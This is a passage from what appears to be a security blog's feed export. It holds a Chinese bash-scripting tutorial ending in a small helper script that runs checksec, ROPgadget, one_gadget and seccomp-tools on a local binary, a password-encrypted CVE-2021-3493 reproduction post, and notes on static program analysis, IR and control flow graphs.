style="text-align:left">检测文件（包括目录）是否存在，如果是，则返回 true。</td><td style="text-align:left">[ -e $file ] 返回 true。</td></tr></tbody></table></div><h1 id="0x04-echo"><a href="#0x04-echo" class="headerlink" title="0x04 echo"></a>0x04 echo</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#-e开启转义</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"pz1o \n"</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"pz1o \c"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"CUMT!"</span></span><br><span class="line"><span class="comment">#''不转义或者变量</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'\n \c'</span></span><br><span class="line"><span class="comment">#``显示命令执行结果</span></span><br><span class="line"><span class="built_in">echo</span> `date`</span><br></pre></td></tr></table></figure><h1 id="0x05-printf"><a href="#0x05-printf" class="headerlink" title="0x05 printf"></a>0x05 printf</h1><p>复制粘贴</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">"%-10s %-8s %-4.2f\n"</span> 人 性别 64.222</span><br><span class="line"><span class="comment"># format-string为双引号</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">"%d %s\n"</span> 1 <span class="string">"abc"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 单引号与双引号效果一样</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">'%d %s\n'</span> 1 <span class="string">"abc"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 没有引号也可以输出</span></span><br><span class="line"><span class="built_in">printf</span> %s abcdef</span><br><span class="line"></span><br><span class="line"><span class="comment"># 格式只指定了一个参数，但多出的参数仍然会按照该格式输出，format-string 被重用</span></span><br><span class="line"><span class="built_in">printf</span> %s abc def</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span> <span class="string">"%s\n"</span> abc def</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span> <span class="string">"%s %s %s\n"</span> a b c d e f g h i j</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果没有 arguments，那么 %s 用NULL代替，%d 用 0 代替</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">"%s and %d \n"</span></span><br></pre></td></tr></table></figure><h1 id="0x06-流程控制"><a href="#0x06-流程控制" class="headerlink" title="0x06 流程控制"></a>0x06 流程控制</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/zsh</span></span><br><span class="line"><span class="comment">#if条件</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'Welcome pwner!'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'-ROP to search some gadgets. \c'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'-one to search onegadget'</span></span><br><span class="line">file=<span class="variable">$1</span></span><br><span class="line">ROP_POP=<span class="string">"pop|ret"</span></span><br><span class="line">ROP_RET=<span class="string">"ret"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'This is the file information \c'</span></span><br><span class="line">file <span class="variable">$&#123;file&#125;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> -x <span class="variable">$&#123;file&#125;</span></span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">`checksec <span class="variable">$&#123;file&#125;</span>`</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">`chmod +x <span class="variable">$&#123;file&#125;</span>`</span><br><span class="line">`checksec <span class="variable">$&#123;file&#125;</span>`</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment">#for循环</span></span><br><span class="line"><span class="keyword">for</span> condition</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">command1</span><br><span class="line">...</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="comment">#while循环</span></span><br><span class="line"><span class="keyword">while</span> condition</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">command</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><h1 id="0x07-函数"><a href="#0x07-函数" class="headerlink" title="0x07 函数"></a>0x07 函数</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[ <span class="keyword">function</span> ] funname [()]</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    action;</span><br><span class="line"></span><br><span class="line">    [<span class="built_in">return</span> int;]</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">funWithReturn</span></span>()&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"这个函数会对输入的两个数字进行相加运算..."</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"输入第一个数字: "</span></span><br><span class="line">    <span class="built_in">read</span> aNum</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"输入第二个数字: "</span></span><br><span class="line">    <span class="built_in">read</span> anotherNum</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"两个数字分别为 <span class="variable">$aNum</span> 和 <span class="variable">$anotherNum</span> !"</span></span><br><span class="line">    <span class="built_in">return</span> $((<span class="variable">$aNum</span>+<span class="variable">$anotherNum</span>))</span><br><span class="line">&#125;</span><br><span class="line">funWithReturn</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"输入的两个数字之和为 $? !"</span></span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th style="text-align:left">参数处理</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">$#</td><td style="text-align:left">传递到脚本或函数的参数个数</td></tr><tr><td style="text-align:left">$*</td><td style="text-align:left">以一个单字符串显示所有向脚本传递的参数</td></tr><tr><td style="text-align:left">$$</td><td style="text-align:left">脚本运行的当前进程ID号</td></tr><tr><td style="text-align:left">$!</td><td style="text-align:left">后台运行的最后一个进程的ID号</td></tr><tr><td style="text-align:left">$@</td><td style="text-align:left">与$*相同，但是使用时加引号，并在引号中返回每个参数。</td></tr><tr><td style="text-align:left">$-</td><td style="text-align:left">显示Shell使用的当前选项，与set命令功能相同。</td></tr><tr><td style="text-align:left">$?</td><td style="text-align:left">显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误。</td></tr></tbody></table></div><h1 id="0x08-文件包含"><a href="#0x08-文件包含" class="headerlink" title="0x08 文件包含"></a>0x08 文件包含</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;demo.sh</span><br><span class="line">source .&#x2F;demo.sh</span><br></pre></td></tr></table></figure><h1 id="0x09-A-demo"><a href="#0x09-A-demo" class="headerlink" title="0x09 A demo"></a>0x09 A demo</h1><p>整合PWN工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#30-37 to highlight</span></span><br><span class="line"><span class="comment">#help</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\e[1;31m"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'[+] Welcome Pwner!'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'[+] -ROP to search some gadgets. '</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'[+] -One to search onegadget'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'[+] -secc to check sandbox'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'[+] example:ch filename [-ROP "pop|ret"] [-One] [-secc]'</span></span><br><span class="line"></span><br><span class="line">file=<span class="variable">$1</span></span><br><span class="line"><span class="comment">#check file exist</span></span><br><span class="line"><span class="keyword">if</span> [[ -z <span class="variable">$&#123;file&#125;</span> ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\e[1;32m"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"You should give a file name"</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment">#file and checksec </span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\e[1;32m"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'[+] This is the file information:'</span></span><br><span class="line">file <span class="variable">$&#123;file&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\e[1;33m"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'[+] The is the security:'</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> -x <span class="variable">$&#123;file&#125;</span></span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">`checksec <span class="variable">$&#123;file&#125;</span>`</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">`chmod +x <span class="variable">$&#123;file&#125;</span>`</span><br><span class="line">`checksec <span class="variable">$&#123;file&#125;</span>`</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#ROPgadget and one_gadget and seccomp</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\e[1;36m"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[+] Some information:"</span></span><br><span class="line"><span class="keyword">for</span> argv <span class="keyword">in</span> <span class="string">"<span class="variable">$@</span>"</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$&#123;argv&#125;</span> = <span class="string">"-ROP"</span> ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">ROPgadget --binary <span class="variable">$&#123;file&#125;</span> --only <span class="string">"<span class="variable">$3</span>"</span></span><br><span class="line"><span class="keyword">elif</span> [[ <span class="variable">$&#123;argv&#125;</span> = <span class="string">"-One"</span> ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">one_gadget <span class="variable">$&#123;file&#125;</span> -l2</span><br><span class="line"><span class="keyword">elif</span> [[ <span class="variable">$&#123;argv&#125;</span> = <span class="string">"-secc"</span> ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">seccomp-tools dump ./<span class="variable">$&#123;file&#125;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;shell是个好东西&lt;/p&gt;</summary>
    
    
    
    
    <category term="others" scheme="https://pz1o.top/tags/others/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-3493复现</title>
    <link href="https://pz1o.top/2021/05/03/CVE-2021-3493%E5%A4%8D%E7%8E%B0/"/>
    <id>https://pz1o.top/2021/05/03/CVE-2021-3493%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-05-03T11:36:49.000Z</published>
    <updated>2021-06-03T09:29:57.389Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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 </div>]]></content>
    
    
    <summary type="html">The article has been encrypted, please enter your password to view.&lt;br&gt;</summary>
    
    
    
    
    <category term="CVE复现" scheme="https://pz1o.top/tags/CVE%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>static program</title>
    <link href="https://pz1o.top/2021/05/03/static-program/"/>
    <id>https://pz1o.top/2021/05/03/static-program/</id>
    <published>2021-05-03T08:16:11.000Z</published>
    <updated>2021-06-09T11:46:15.299Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-Static-Program-Analysis"><a href="#0x01-Static-Program-Analysis" class="headerlink" title="0x01 Static Program Analysis"></a>0x01 Static Program Analysis</h1><a id="more"></a><h2 id="1-introduction"><a href="#1-introduction" class="headerlink" title="1.introduction"></a>1.introduction</h2><p><img src="/2021/05/03/static-program/image-20210315224533888.png" alt="image-20210315224533888"></p><h2 id="2-sound-and-complete"><a href="#2-sound-and-complete" class="headerlink" title="2.sound and complete"></a>2.sound and complete</h2><p><img src="/2021/05/03/static-program/image-20210315231054502.png" alt="image-20210315231054502"></p><p><img src="/2021/05/03/static-program/image-20210315231536756.png" alt="image-20210315231536756"></p><h2 id="3-what-is-static-analysis"><a href="#3-what-is-static-analysis" class="headerlink" title="3.what is static analysis"></a>3.what is static analysis</h2><p>a view as this draw</p><p><img src="/2021/05/03/static-program/image-20210316000124963.png" alt="image-20210316000124963"></p><h2 id="4-abstraction-and-overapproximation"><a href="#4-abstraction-and-overapproximation" class="headerlink" title="4.abstraction and overapproximation"></a>4.abstraction and overapproximation</h2><p>first,abstraction</p><p><img src="/2021/05/03/static-program/image-20210316000642671.png" alt="image-20210316000642671"></p><p>next,transfer function</p><p><img src="/2021/05/03/static-program/image-20210316001346346.png" alt="image-20210316001346346"></p><p>it is similar to Symbolic execution</p><p><img src="/2021/05/03/static-program/image-20210316001430168.png" alt="image-20210316001430168"></p><p>last control flow.</p><p><img src="/2021/05/03/static-program/image-20210316001748641.png" alt="image-20210316001748641"></p><h1 id="0x02-Intermediate-Representation"><a href="#0x02-Intermediate-Representation" class="headerlink" title="0x02 Intermediate Representation"></a>0x02 Intermediate Representation</h1><h2 id="1-Compiler"><a href="#1-Compiler" class="headerlink" title="1.Compiler"></a>1.Compiler</h2><p><img src="/2021/05/03/static-program/image-20210316010120880.png" alt="image-20210316010120880"></p><h2 id="2-AST-vs-IR"><a href="#2-AST-vs-IR" class="headerlink" title="2.AST vs IR"></a>2.AST vs IR</h2><p><img src="/2021/05/03/static-program/image-20210316010715717.png" alt="image-20210316010715717"></p><h2 id="3-3-Address-Code"><a href="#3-3-Address-Code" class="headerlink" title="3.3-Address Code"></a>3.3-Address Code</h2><p><img src="/2021/05/03/static-program/image-20210316010948812.png" alt="image-20210316010948812"></p><p><strong>Forms</strong></p><p><img src="/2021/05/03/static-program/image-20210316012707595.png" alt="image-20210316012707595"></p><h2 id="4-Soot-‘s-‘Jimple"><a href="#4-Soot-‘s-‘Jimple" class="headerlink" title="4.Soot ‘s ‘Jimple"></a>4.Soot ‘s ‘Jimple</h2><h3 id="for"><a href="#for" class="headerlink" title="for"></a>for</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ForLoop3AC</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> x=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">x = x+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/05/03/static-program/image-20210316012632094.png" alt="image-20210316012632094"></p><h3 id="do…while"><a href="#do…while" class="headerlink" title="do…while"></a>do…while</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DoWhileLoop3AC</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">i = i+<span class="number">1</span>;</span><br><span class="line">&#125;<span class="keyword">while</span>(arr[i]&lt;<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/05/03/static-program/image-20210316013150012.png" alt="image-20210316013150012"></p><blockquote><p>$代表临时变量</p></blockquote><h3 id="method-call"><a href="#method-call" class="headerlink" title="method call"></a>method call</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MethodCall3AC</span></span>&#123;</span><br><span class="line"><span class="function">String <span class="title">foo</span><span class="params">(String para1, String para2)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> para1 + <span class="string">" "</span> + para2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String []args)</span></span>&#123;</span><br><span class="line">MethodCall3AC mc = <span class="keyword">new</span> MethodCall3AC();</span><br><span class="line">    String result = mc.foo(<span class="string">"hello"</span>,<span class="string">"world"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>method signature</code>:class name/return type/method name(parameter1 type,parameter2 type…)</p><p><img src="/2021/05/03/static-program/image-20210316125222155.png" alt="image-20210316125222155"></p></blockquote><p><img src="/2021/05/03/static-program/image-20210316124211598.png" alt="image-20210316124211598"></p><p><img src="/2021/05/03/static-program/image-20210316124243765.png" alt="image-20210316124243765"></p><h3 id="class"><a href="#class" class="headerlink" title="class"></a>class</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Class3AC</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">double</span> pi = <span class="number">3.14</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/05/03/static-program/image-20210316125913305.png" alt="image-20210316125913305"></p><h2 id="5-SSA-Static-Single-Assignment"><a href="#5-SSA-Static-Single-Assignment" class="headerlink" title="5.SSA(Static Single Assignment)"></a>5.SSA(Static Single Assignment)</h2><p>Every variable has exactly one definition</p><p>function to deal with two or many variables</p><p><img src="/2021/05/03/static-program/image-20210316130354246.png" alt="image-20210316130354246"></p><h2 id="6-Control-Flow-Graph"><a href="#6-Control-Flow-Graph" class="headerlink" title="6.Control Flow Graph"></a>6.Control Flow Graph</h2><p>Nodes:BBs</p><p>Edge</p><p><img src="/2021/05/03/static-program/image-20210316130826596.png" alt="image-20210316130826596"></p><h3 id="Basic-Block"><a href="#Basic-Block" class="headerlink" title="Basic Block"></a>Basic Block</h3><p><strong>definition</strong></p><ol><li>It can be entered only at the beginning.</li><li>It can be exited only at the end</li><li>It should be a maximal.</li></ol><p><strong>how to build it</strong></p><p>determine leader </p><p><img src="/2021/05/03/static-program/image-20210316131723881.png" alt="image-20210316131723881"></p><p>eg:</p><p>这个例子太形象了，不得不用中文说一下</p><ol><li>first,determine leader(first instruction/jump target/follow jump)</li><li>build BBs</li></ol><p><img src="/2021/05/03/static-program/image-20210316132039750.png" alt="image-20210316132039750"></p><h3 id="Edge"><a href="#Edge" class="headerlink" title="Edge"></a>Edge</h3><p><strong>how to</strong></p><p>There are two cases</p><p><img src="/2021/05/03/static-program/image-20210316132843680.png" alt="image-20210316132843680"></p><h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><p><img src="/2021/05/03/static-program/image-20210316133326936.png" alt="image-20210316133326936"></p><h1 id="0x03Data-Flow-Analysis-Applications"><a href="#0x03Data-Flow-Analysis-Applications" class="headerlink" title="0x03Data Flow 